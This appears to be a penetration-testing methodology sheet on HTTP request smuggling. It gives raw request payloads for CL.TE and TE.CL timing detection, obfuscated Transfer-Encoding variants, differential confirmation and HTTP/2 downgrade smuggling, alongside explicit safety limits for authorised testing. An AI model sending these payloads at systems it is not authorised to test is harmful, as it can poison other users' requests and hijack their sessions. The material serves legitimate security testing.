# HTTP Request Smuggling

A front-end and back-end disagree on where a request ends, letting you prepend bytes onto the next visitor's request. Requires a proxy/CDN + origin chain. Detect with timing first (safe), confirm with a differential, prove with a benign socket-poisoning demo against yourself.

## Tier 0 — Safety
Smuggling can poison *other users'* requests. Test with the **timing technique** first (self-contained, no victim), and prove impact by poisoning your *own* second request. Never leave a poisoned socket that could catch a real user. Keep the queue clean; one clear PoC then stop.

## Tier 1 — CL.TE detection (timing)
Front-end uses Content-Length, back-end uses Transfer-Encoding. A short body + chunked terminator makes the back-end wait for more → delay.
```
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
A ~5s+ hang on this vs a normal request = CL.TE candidate.

## Tier 1 — TE.CL detection (timing)
Front-end honors Transfer-Encoding, back-end honors Content-Length.
```
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
Send with the trailing bytes; timing/differential response reveals the split.

## Tier 2 — TE.TE (header obfuscation)
Both support TE, but one can be tricked into ignoring it — smuggle by mangling the header so only one parser drops it.
```
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:chunked      (no space)
Transfer-Encoding: chunked\r\n
Transfer-Encoding\t: chunked
Transfer-Encoding: chunk       (typo variant)
X: X\nTransfer-Encoding: chunked   (folded)
```
Whichever obfuscation one server ignores → falls back to CL.TE or TE.CL.

## Tier 2 — Confirm with differential (safe)
Prepend a broken prefix that only reveals itself on the *victim's* (your own) next request — send a follow-up normal request and watch for the injected prefix altering its response (e.g. a 404 on a valid path, or your `G` prepended to the method).
```
POST / HTTP/1.1
Host: target
Content-Length: 26
Transfer-Encoding: chunked

0

GET /404here HTTP/1.1
X: y
```
Follow immediately with a normal `GET /` on the same connection; a 404 for the valid path confirms the smuggle landed.

## Tier 3 — HTTP/2 downgrade (H2.CL / H2.TE)
Front-end speaks h2, downgrades to h1 to the origin; the origin then trusts a smuggled CL/TE you inject into an h2 body/header.
```
# H2.CL — inject a Content-Length via h2 pseudo/regular header (h2 forbids it, but downgrade may keep it)
:method POST   :path /   :authority target
content-length: 0

SMUGGLED PREFIX...
```
```
# H2.TE — inject transfer-encoding: chunked into the h2 request
:method POST   :path /
transfer-encoding: chunked

0

GET /404here HTTP/1.1
...
```
Also test CRLF injection into h2 header *values* (h2 has no line framing, so `\r\n` in a value can forge headers post-downgrade).

## Stop when
Timing signal + one differential PoC where your smuggled prefix demonstrably alters the *next* request on the connection (a 404 on a valid path, or a captured/echoed injected header) — ideally captured against your own follow-up request. That proves desync. Do not run it in a loop, do not capture other users' requests, flush the connection after. One clean reproduction is the report. Stop.
